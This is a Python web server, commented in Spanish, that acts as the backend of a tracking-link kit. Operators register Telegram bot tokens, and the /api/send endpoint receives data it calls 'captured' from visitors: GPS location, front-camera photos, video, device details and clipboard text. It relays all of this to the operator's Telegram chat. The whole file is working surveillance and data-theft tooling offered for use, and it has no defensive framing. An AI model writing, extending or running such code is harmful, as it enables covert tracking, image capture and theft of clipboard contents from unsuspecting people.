from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs
import json
import os
import uuid
import requests
from datetime import datetime

DATA_FILE = "bots.json"

def load_bots():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except:
            return []
    return []

def save_bots(bots):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(bots, f, indent=2, ensure_ascii=False)

class Handler(SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        
        # Servir index.html
        if parsed.path in ("/", "/main"):
            self.path = "/index.html"
            return super().do_GET()
        
        # CSRF Token
        elif parsed.path == "/api/csrf":
            csrf_token = str(uuid.uuid4())
            body = json.dumps({"csrfToken": csrf_token}).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        
        # Session (debe devolver uid para que no recargue en bucle)
        elif parsed.path == "/api/auth/session":
            body = json.dumps({"uid": "user_" + str(uuid.uuid4())[:8]}).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        
        # Listar bots (CRÍTICO: debe devolver array con botName, chatId, id)
        elif parsed.path == "/api/links/list":
            bots = load_bots()
            body = json.dumps(bots, ensure_ascii=False).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        
        # Servir archivos estáticos
        super().do_GET()

    def do_POST(self):
        parsed = urlparse(self.path)
        content_length = int(self.headers.get("Content-Length", 0))
        body_raw = self.rfile.read(content_length).decode("utf-8", errors="ignore")
        
        print(f"\n📩 POST {self.path}")
        print(f"📦 Body: {body_raw[:200]}")

        try:
            data = json.loads(body_raw) if body_raw else {}
        except:
            data = {}

        # Crear nuevo bot
        if parsed.path == "/api/links/create":
            bots = load_bots()
            new_bot = {
                "id": str(uuid.uuid4())[:8],
                "botName": f"Bot_{len(bots)+1}",
                "botToken": data.get("botToken", ""),
                "chatId": data.get("chatId", ""),
                "status": "ACTIVE",
                "createdAt": datetime.now().isoformat()
            }
            bots.append(new_bot)
            save_bots(bots)
            print(f"✅ Bot creado: {new_bot['botName']}")
            
            body = json.dumps(new_bot, ensure_ascii=False).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return

        # Logout
        elif parsed.path == "/api/auth/logout":
            body = json.dumps({"success": True}).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return

        # Enviar datos capturados (location, photo, video, device_info, clipboard)
        elif parsed.path == "/api/send":
            link_id = data.get("linkId")
            send_type = data.get("type")
            send_data = data.get("data", {})
            
            bots = load_bots()
            bot = next((b for b in bots if b.get("id") == link_id), None)
            
            if bot:
                token = bot.get("botToken")
                chat_id = bot.get("chatId")
                
                try:
                    # Enviar según el tipo
                    if send_type == "location":
                        lat = send_data.get("latitude")
                        lon = send_data.get("longitude")
                        text = f"📍 **Location**\n\nLatitude: {lat}\nLongitude: {lon}\n\n[Ver en mapa](https://www.google.com/maps?q={lat},{lon})"
                        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                                    json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"})
                    
                    elif send_type == "device_info":
                        device = send_data.get("deviceInfo", {})
                        clipboard = send_data.get("clipboard", "")
                        text = f"""📱 **Device Info**

🔹 Brand: {device.get('brand', 'Unknown')}
🔹 OS: {device.get('osVersion', 'Unknown')}
🔹 Type: {device.get('deviceType', 'Unknown')}
🔹 Clipboard: {clipboard or 'Empty'}
"""
                        requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
                                    json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"})
                    
                    elif send_type == "photo":
                        photo_data = send_data
                        if isinstance(photo_data, str) and "base64," in photo_data:
                            photo_data = photo_data.split("base64,")[1]
                        
                        # Convertir base64 a bytes
                        import base64
                        photo_bytes = base64.b64decode(photo_data)
                        
                        # Enviar foto
                        files = {"photo": ("photo.jpg", photo_bytes, "image/jpeg")}
                        requests.post(f"https://api.telegram.org/bot{token}/sendPhoto",
                                    files=files,
                                    data={"chat_id": chat_id, "caption": "📸 Front Camera"})
                    
                    elif send_type == "video":
                        video_data = send_data
                        duration = send_data.get("duration", 0)
                        
                        # Video viene como base64 o data URL
                        if isinstance(video_data, str) and "base64," in video_data:
                            video_data = video_data.split("base64,")[1]
                        
                        import base64
                        video_bytes = base64.b64decode(video_data)
                        
                        files = {"video": ("video.webm", video_bytes, "video/webm")}
                        requests.post(f"https://api.telegram.org/bot{token}/sendVideo",
                                    files=files,
                                    data={"chat_id": chat_id, "caption": f"🎥 Video ({duration}s)"})
                    
                    elif send_type == "clipboard":
                        text = send_data.get("text", "")
                        requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
                                    json={"chat_id": chat_id, "text": f"📋 **Clipboard**\n\n{text}", "parse_mode": "Markdown"})
                    
                    print(f"✅ Enviado a Telegram: {send_type}")
                    
                except Exception as e:
                    print(f"❌ Error enviando a Telegram: {e}")
            
            body = json.dumps({"success": True}).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return

        # Fallback
        body = json.dumps({"success": True}).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_DELETE(self):
        parsed = urlparse(self.path)
        query = parse_qs(parsed.query)
        bot_id = query.get("id", [""])[0]
        
        if parsed.path == "/api/links/delete" and bot_id:
            bots = load_bots()
            bots = [b for b in bots if b.get("id") != bot_id]
            save_bots(bots)
            print(f"🗑️ Bot eliminado: {bot_id}")
        
        body = json.dumps({"success": True}).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_PUT(self):
        parsed = urlparse(self.path)
        query = parse_qs(parsed.query)
        bot_id = query.get("id", [""])[0]
        content_length = int(self.headers.get("Content-Length", 0))
        body_raw = self.rfile.read(content_length).decode("utf-8", errors="ignore")
        
        try:
            data = json.loads(body_raw)
        except:
            data = {}
        
        if parsed.path == "/api/links/update" and bot_id:
            bots = load_bots()
            for bot in bots:
                if bot.get("id") == bot_id:
                    bot["botToken"] = data.get("botToken", bot.get("botToken"))
                    bot["chatId"] = data.get("chatId", bot.get("chatId"))
                    break
            save_bots(bots)
            print(f"✏️ Bot actualizado: {bot_id}")
        
        body = json.dumps({"success": True}).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, X-CSRF-Token")
        self.end_headers()

    def log_message(self, format, *args):
        pass

if __name__ == "__main__":
    print("🚀 Servidor corriendo en: http://127.0.0.1:8080")
    print("📱 Abre: http://127.0.0.1:8080/main")
    server = ThreadingHTTPServer(("127.0.0.1", 8080), Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n⏹️ Servidor detenido")
        server.shutdown()
